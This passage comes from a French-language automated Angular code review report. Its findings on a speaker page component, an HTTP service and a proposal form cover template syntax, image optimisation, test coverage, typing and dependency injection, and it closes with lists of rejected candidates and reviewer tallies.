**Correctif** — `@if (speaker(); as speaker) { … } @else { <p class="status">Chargement du speaker…</p> }` et `@for (talk of talks(); track talk.id) { … } @empty { <p>Aucun talk.</p> }`, puis retirer `NgIf`/`NgFor` des `imports`. Migration : `ng generate @angular/core:control-flow`.

> Note de vérification : Regroupe les lignes 5, 6 et 22 (F-042, F-044, F-046) ainsi que l'absence de track (F-047) : passer à @if / @for (talk of talks(); track talk.id).

Source : https://angular.dev/guide/templates/control-flow

### 🟡 F-043 · R-PERF-034 — <img src> sans NgOptimizedImage
`src/app/speakers/speaker-spotlight.html:5` · performance · confiance high · scan+review · sévérité INFO → MINOR (angular-performance-reviewer)

```html
<img *ngIf="speaker.photoUrl" class="spotlight__photo" [src]="speaker.photoUrl" />
```
**Problème** — La photo du speaker passe par `[src]` sans `NgOptimizedImage`, alors qu'AGENTS.md impose `NgOptimizedImage` pour les images. C'est le premier visuel de la page, donc le candidat LCP : il n'a ni `priority`/preload, ni `srcset`, ni attributs `width`/`height` intrinsèques. La taille n'est fixée que par la CSS (5rem), et la photo d'origine, potentiellement en haute définition, est téléchargée en entier.

**Correctif** — Importer `NgOptimizedImage` et écrire `<img class="spotlight__photo" [ngSrc]="speaker().photoUrl" width="80" height="80" priority [alt]="speaker().name" />` (dans un `@if`).

Source : https://angular.dev/guide/image-optimization

### 🟡 F-048 · R-TEST-006
`src/app/speakers/speaker-spotlight.spec.ts:13` · testing · confiance high · review

```ts
providers: [provideHttpClient(), provideRouter([])],
```
**Problème** — Le spec fournit le vrai `HttpClient` sans `provideHttpClientTesting()`. Il ne fait aucun appel aujourd'hui uniquement parce que le composant n'est jamais rendu ; dès qu'un test déclenchera `ngOnInit`, `SpeakerService` appellera réellement `http://localhost:3000/api/speakers/...` : test dépendant du réseau, lent et non déterministe en CI.

**Correctif** — `providers: [provideHttpClient(), provideHttpClientTesting(), provideRouter([])]`, puis `const http = TestBed.inject(HttpTestingController); http.expectOne('http://localhost:3000/api/speakers/camille').flush(CAMILLE); http.expectOne('http://localhost:3000/api/speakers/camille/talks').flush([SIGNALS_TALK]); afterEach(() => http.verify());`

Source : https://angular.dev/guide/http/testing

### 🟡 F-049 · R-TEST-003 — Spec qui ne vérifie que la création
`src/app/speakers/speaker-spotlight.spec.ts:21` · testing · confiance medium · scan+review

```ts
expect(component).toBeTruthy();
```
**Problème** — Seul test du composant, il ne vérifie que l'instanciation : aucun rendu n'est déclenché (pas de `whenStable`/`detectChanges`), donc `ngOnInit`, le chargement du speaker et de ses talks, l'affichage des initiales, l'émission de `select` au clic sur un talk et `addAllToFavorites()` ne sont jamais exercés. Le test reste vert même si tout ce comportement est cassé.

**Correctif** — Mocker `SpeakerService` (ou utiliser `HttpTestingController`), fournir le paramètre de route, puis vérifier le DOM et les effets : `TestBed.configureTestingModule({ imports: [SpeakerSpotlight], providers: [provideRouter([]), { provide: SpeakerService, useValue: { getSpeaker: () => of(CAMILLE), getTalks: () => of([SIGNALS_TALK]) } }, { provide: ActivatedRoute, useValue: { paramMap: of(convertToParamMap({ id: 'camille' })) } }] }); const fixture = TestBed.createComponent(SpeakerSpotlight); await fixture.whenStable(); expect(fixture.nativeElement.querySelector('h1')?.textContent).toContain('Camille Laurent'); fixture.nativeElement.querySelector('button')!.click(); expect(TestBed.inject(FavoritesStore).has(SIGNALS_TALK.id)).toBe(true);`

> Note de vérification : C'est pour ça que F-003 (NG0203) passe inaperçu : sans rendu, ngOnInit ne tourne jamais. Ajouter `await fixture.whenStable()` et des assertions sur le DOM.

Source : https://angular.dev/guide/testing/components-basics

### 🟡 F-050 · R-SIG-001 — Décorateurs @Input/@Output au lieu de input()/output()
`src/app/speakers/speaker-spotlight.ts:17` · reactivity · confiance high · scan+review

```ts
@Input() speakerId!: string;
```
**Problème** — Nouveau composant qui utilise `@Input()` (ligne 17) et `@Output() ... new EventEmitter` (ligne 18) au lieu de `input()` / `output()`, imposés par AGENTS.md. `speakerId` n'est pas lisible réactivement : il ne peut pas alimenter un `computed`/`toObservable`, alors que c'est justement le repli de l'id du speaker.

**Correctif** — `readonly speakerId = input<string>();` et `readonly select = output<string>();` (penser aussi à renommer `select`, qui masque l'événement DOM natif `select`). Migration auto : `ng generate @angular/core:signal-input-migration` puis `ng generate @angular/core:output-migration`.

> Note de vérification : Regroupe la ligne 18 (F-052).

Source : https://angular.dev/guide/components/inputs

### 🟡 F-051 · R-ARCH-021
`src/app/speakers/speaker-spotlight.ts:17` · architecture · confiance high · review

```ts
@Input() speakerId!: string;
```
**Problème** — Input mort : `withComponentInputBinding()` (app.config.ts) lie le paramètre `:id` à un input nommé `id`, pas `speakerId`, et le composant est routé, donc `speakerId` n'est jamais renseigné. Le repli `params.get('id') ?? this.speakerId` (ligne 31) est du code mort, et le subscribe manuel à `paramMap` (ligne 30) refait ce que l'input binding fournit déjà (comme dans talk-detail.ts).

**Correctif** — Remplacer par `readonly id = input.required<string>();` (même convention que `TalkDetail`) et supprimer l'injection d'`ActivatedRoute` et le subscribe à `paramMap`.

Source : https://angular.dev/guide/routing/common-router-tasks#getting-route-information

### 🟡 F-053 · R-ARCH-029 — `any` explicite
`src/app/speakers/speaker-spotlight.ts:20` · architecture · confiance high · scan+review

```ts
speaker: any;
```
**Problème** — `speaker: any` et `talks: any[]` (ligne 21) désactivent le type-checking strict des templates. Conséquence concrète : le template lit `speaker.photoUrl`, qui n'existe pas dans l'interface `Speaker` (talk.model.ts) ; avec un vrai type, le build l'aurait signalé.

**Correctif** — Typer avec les modèles existants : `protected readonly speaker = computed<Speaker | undefined>(...)` et `protected readonly talks = computed<Talk[]>(...)` (import depuis `../talks/talk.model`), puis retirer la branche photo ou ajouter `photoUrl?` au modèle.

> Note de vérification : Regroupe la ligne 21 (F-054). Le typage aurait révélé que `photoUrl` n'existe pas sur Speaker.

Source : https://angular.dev/tools/cli/template-typecheck

### 🔵 F-055 · R-ARCH-008
`src/app/speakers/speaker-spotlight.ts:21` · architecture · confiance high · review · sévérité MINOR → INFO

```ts
talks: any[] = [];
```
**Problème** — Membres lus uniquement par le template laissés publics : `speaker`, `talks`, `bioHtml`, `getInitials`, `addAllToFavorites` (lignes 20 à 50). Les dépendances injectées (lignes 24 à 27) ne sont pas non plus `readonly`, contrairement au reste du dépôt.

**Correctif** — `protected readonly talks = ...`, `protected addAllToFavorites(): void`, et `private readonly favorites = inject(FavoritesStore);`.

Source : https://angular.dev/style-guide

### 🟡 F-056 · R-ARCH-024
`src/app/speakers/speaker-spotlight.ts:42` · architecture · confiance high · review

```ts
getInitials(name: string): string {
```
**Problème** — Réimplémente `initialsOf` (talks/initials.ts), déjà utilisée par TalkCard et TalkDetail, avec un comportement différent : pas de limite à deux lettres ni de gestion des espaces multiples, donc des avatars incohérents d'une page à l'autre. Elle est aussi appelée comme méthode dans le template (R-ARCH-011) au lieu d'un `computed`.

**Correctif** — `protected readonly initials = computed(() => initialsOf(this.speaker()?.name ?? ''));` et `{{ initials() }}` dans le template ; supprimer `getInitials`.

> Note de vérification : Regroupe F-045 : `protected readonly initials = computed(() => initialsOf(this.speaker()?.name ?? ''))`.

Source : https://angular.dev/style-guide

### 🟡 F-058 · R-TEST-001
`src/app/speakers/speaker.service.ts:6` · testing · confiance high · review

```ts
export class SpeakerService {
```
**Problème** — Nouveau service HTTP sans `speaker.service.spec.ts` : les URLs appelées (`/api/speakers/:id` et `/api/speakers/:id/talks`) ne sont vérifiées par aucun test, et le spec du composant ne les exerce pas non plus.

**Correctif** — Créer `speaker.service.spec.ts` : `TestBed.configureTestingModule({ providers: [provideHttpClient(), provideHttpClientTesting()] }); const service = TestBed.inject(SpeakerService); const http = TestBed.inject(HttpTestingController); let result: unknown; service.getTalks('camille').subscribe((t) => (result = t)); http.expectOne('http://localhost:3000/api/speakers/camille/talks').flush([SIGNALS_TALK]); expect(result).toEqual([SIGNALS_TALK]); http.verify();`

> Note de vérification : Sans objet si le service est remplacé par TalksStore (F-026).

Source : https://angular.dev/guide/http/testing

### 🟡 F-059 · R-ARCH-007 — Injection par paramètres de constructeur
`src/app/speakers/speaker.service.ts:9` · architecture · confiance high · scan+review

```ts
constructor(private http: HttpClient) {}
```
**Problème** — Injection par constructeur dans du code neuf, alors qu'AGENTS.md impose `inject()` et que tout le reste du dépôt (TalksStore, FavoritesStore…) l'utilise.

**Correctif** — `private readonly http = inject(HttpClient);`. Pour un nouveau service racine en v22, `@Service()` peut remplacer `@Injectable({ providedIn: 'root' })` (R-ARCH-034).

Source : https://angular.dev/reference/migrations/inject-function

### 🟡 F-060 · R-ARCH-029 — `any` explicite
`src/app/speakers/speaker.service.ts:11` · architecture · confiance high · scan+review

```ts
getSpeaker(id: string): Observable<any> {
```
**Problème** — `Observable<any>` pour `getSpeaker` et `getTalks` (ligne 16) : le `any` se propage jusqu'au composant et au template, alors que les interfaces `Speaker` et `Talk` existent déjà.

**Correctif** — `getSpeaker(id: string): Observable<Speaker> { return this.http.get<Speaker>(...); }` et `getTalks(...): Observable<Talk[]>` — si le service est conservé (voir R-ARCH-030).

> Note de vérification : Regroupe la ligne 16 (F-062).

Source : https://angular.dev/tools/cli/template-typecheck

### 🟡 F-061 · R-ARCH-022 — console.log résiduel
`src/app/speakers/speaker.service.ts:12` · architecture · confiance high · scan+review

```ts
console.log('getSpeaker', id);
```
**Problème** — `console.log` de debug resté dans le service : il pollue la console à chaque navigation vers un speaker (donnée non sensible, d'où MINOR).

**Correctif** — Supprimer la ligne.

Source : https://angular.dev/best-practices/error-handling

### 🔵 F-064 · R-ARCH-026
`src/app/proposals/proposal-form.ts:20` · architecture · confiance medium · review

```ts
abstract = signal(localStorage.getItem(ABSTRACT_DRAFT_KEY) ?? '');
```
**Problème** — Deux modèles d'état coexistent dans le même formulaire : `title`, `track` et `bio` vivent dans le FormGroup, le résumé dans un signal relié à la main (`[value]` + `(input)`). Résultat : `form.invalid` ignore le résumé (la limite « 600 caractères » affichée n'est jamais validée), et `track` est dupliqué entre le contrôle et `selectedTrack`.

**Correctif** — Mettre le résumé dans le formulaire (`abstract: ['', Validators.maxLength(600)]`) et dériver `selectedTrack` / `charCount` avec `toSignal(...)` — ou tout basculer en Signal Forms, où le modèle est un seul signal.

> Note de vérification : Conséquence concrète : la limite de 600 caractères affichée n'est validée nulle part.

Source : https://angular.dev/style-guide

## Écartés à la vérification

Candidats rejetés pendant l'étape de vérification, avec la raison. Ils alimentent les evals (précision du skill).

- ~~R-ARCH-017~~ `src/app/speakers/speaker-spotlight.ts:35` — Doublon de F-022 (subscribes imbriqués, même fichier). Les requêtes HTTP se terminent : pas de fuite durable.
- ~~R-ARCH-019~~ `src/app/favorites/favorites.store.ts:28` — Doublon de F-009.
- ~~R-PERF-021~~ `src/app/favorites/favorites.store.ts:28` — Doublon de F-009.
- ~~R-TEST-007~~ `src/app/favorites/favorites.store.ts:28` — Couvert par F-009 (le test à ajouter y est mentionné).
- ~~R-ARCH-017~~ `src/app/speakers/speaker-spotlight.ts:32` — Doublon de F-022.
- ~~R-RX-001~~ `src/app/speakers/speaker-spotlight.ts:35` — Doublon de F-022.
- ~~R-PERF-035~~ `src/app/speakers/speaker-spotlight.ts:36` — Doublon de F-023 (même fichier, même règle).
- ~~R-A11Y-011~~ `src/app/talks/talk-card.ts:28` — Regroupé dans F-007 (même ligne, même cause).
- ~~R-TEST-007~~ `src/app/talks/talk-card.ts:28` — Regroupé dans F-007 : ajouter un test du message dans talk-card.spec.ts.
- ~~R-TEST-001~~ `src/app/proposals/proposal-form.ts:1` — Doublon de F-013.
- ~~R-ARCH-031~~ `src/app/proposals/proposal-form.ts:3` — Regroupé dans F-034 (même fichier, même règle).
- ~~R-ARCH-031~~ `src/app/proposals/proposal-form.ts:16` — Regroupé dans F-034.
- ~~R-TEST-001~~ `src/app/proposals/proposal.guard.ts:1` — Doublon de F-016.
- ~~R-ARCH-028~~ `src/app/speakers/speaker-spotlight.html:5` — Regroupé dans F-041.
- ~~R-ARCH-028~~ `src/app/speakers/speaker-spotlight.html:6` — Regroupé dans F-041.
- ~~R-PERF-037~~ `src/app/speakers/speaker-spotlight.html:6` — Regroupé dans F-056 : remplacer la méthode par un computed basé sur initialsOf.
- ~~R-ARCH-028~~ `src/app/speakers/speaker-spotlight.html:22` — Regroupé dans F-041.
- ~~R-PERF-036~~ `src/app/speakers/speaker-spotlight.html:22` — Regroupé dans F-041 (track talk.id).
- ~~R-SIG-001~~ `src/app/speakers/speaker-spotlight.ts:18` — Regroupé dans F-050.
- ~~R-ARCH-029~~ `src/app/speakers/speaker-spotlight.ts:21` — Regroupé dans F-053.
- ~~R-TEST-001~~ `src/app/speakers/speaker.service.ts:1` — Doublon de F-058.
- ~~R-ARCH-029~~ `src/app/speakers/speaker.service.ts:16` — Regroupé dans F-060.
- ~~R-ARCH-026~~ `src/app/app.routes.ts:22` — Regroupé dans F-008.
- ~~R-SIG-009~~ `src/app/proposals/proposal-form.ts:27` — Couvert par F-034 et F-064.
- ~~R-ARCH-034~~ `src/app/proposals/proposal.guard.ts:6` — @Injectable({ providedIn: 'root' }) reste valide en v22 : aucune conséquence concrète.
- ~~R-ARCH-034~~ `src/app/speakers/speaker.service.ts:5` — @Injectable({ providedIn: 'root' }) reste valide en v22 : aucune conséquence concrète.

## Points positifs

- Le lien vers la page speaker depuis TalkCard passe par [routerLink] avec un tableau de segments, sans concaténation d'URL.

## Reviewers

- scan — 44 constat(s) brut(s)
- angular-a11y-error-reviewer — 7 constat(s) brut(s)
- angular-architecture-reviewer — 20 constat(s) brut(s)
- angular-performance-reviewer — 8 constat(s) brut(s)
- angular-reactivity-reviewer — 7 constat(s) brut(s)
- angular-security-reviewer — 1 constat(s) brut(s)
- angular-testing-reviewer — 8 constat(s) brut(s)

## Validation empirique

Non exécutée.

---

<sub>angular-review v2 · règles : `references/*.md` · verdict calculé par `scripts/findings.mjs` (≥ 1 BLOCKER ou ≥ 3 MAJOR → REQUEST_CHANGES ; 0 finding → APPROVE ; sinon COMMENT) · données : `.review/findings.json`</sub>
